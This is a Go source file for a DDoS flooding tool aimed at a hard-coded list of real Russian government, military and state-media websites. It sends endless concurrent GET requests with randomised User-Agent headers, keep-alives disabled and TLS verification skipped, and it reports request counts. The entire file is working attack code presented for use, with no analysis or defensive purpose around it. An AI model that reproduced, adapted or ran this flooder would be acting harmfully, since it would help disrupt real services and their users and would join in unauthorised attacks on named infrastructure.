package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"sync"
	"github.com/corpix/uarand"
	"strconv"
	"time"
)

func main() {
	urls := []string{
		"https://kremlin.ru",
		"https://government.ru",
		"https://mil.ru",
		"https://www.rt.com/",
		"http://lenta.ru/",
		"https://ria.ru/",
		"https://www.rbc.ru/",
		"https://tass.ru/",
		"https://tvzvezda.ru/",
		"https://vsoloviev.ru/",
		"https://www.1tv.ru/",
		"https://www.vesti.ru/",
}

	var concurrency int
	flag.IntVar(&concurrency, "c", 16, "concurrency level")

	var debug bool
	flag.BoolVar(&debug, "d", false, "toggle debug mode")

	flag.Parse()

	// urlsChannel := make(chan string)
	outputChannel := make(chan string)

	// req counter
	var (
		mutex sync.Mutex
		reqCount uint64
	)

	// Start req routines
	var jobWG sync.WaitGroup

	fmt.Println("[status] " + time.Now().Format("15:04") + " | starting... " + strconv.FormatInt(int64(concurrency), 10) + " threads, " + strconv.FormatInt(int64(len(urls)), 10) + " websites")
	fmt.Println("targets:")
	for _, url := range urls {
		fmt.Println(url)
	}

	for i := 0; i < concurrency; i++ {
		jobWG.Add(1)
		go makeReq(urls[i % len(urls)], outputChannel, &reqCount, mutex, &jobWG, debug)
	}

	// Start the output chan worker for results
	var outputWG sync.WaitGroup
	outputWG.Add(1)
	go func() {
		for o := range outputChannel {
			fmt.Println(o)
		}
		outputWG.Done()
	}()

	go printStatus(outputChannel, &reqCount)

	// Close output channel
	go func() {
		jobWG.Wait()
		close(outputChannel)
	}()

	outputWG.Wait()
}

func makeReq(url string, o chan string, reqCount *uint64, mutex sync.Mutex, group *sync.WaitGroup, debug bool)  {
	if (debug) {
		o <- "[info] started thread for " + url
	}

	for true {
		if (debug) {
			o <- "[info] probing " + url
		}

		client := &http.Client{
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
			Transport: &http.Transport{
				DisableKeepAlives: true,
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},

		}

		req, err := http.NewRequest("GET", url, nil)
		req.Header.Add("User-Agent", uarand.GetRandom())

		if err != nil {
			if (debug) {
				o <- "[error] " + err.Error()
			}
			continue
		}
		resp, err := client.Do(req)
		mutex.Lock()
		*reqCount++
		mutex.Unlock()

		if (err != nil) {
			if (debug) {
				o <- "[error] " + err.Error()
			}
			continue
		}
		resp.Body.Close()

		if (debug) {
			o <- "[" + fmt.Sprintf("%d", resp.StatusCode) + "] " + url
		}
	}

	group.Done()
}

func printStatus(o chan string, reqCount *uint64) {
	for range time.Tick(time.Second * 120) {
		o <-  "[status] " + time.Now().Format("15:04") + " running... " + strconv.FormatInt(int64(*reqCount), 10) + " request sent"
	}
}
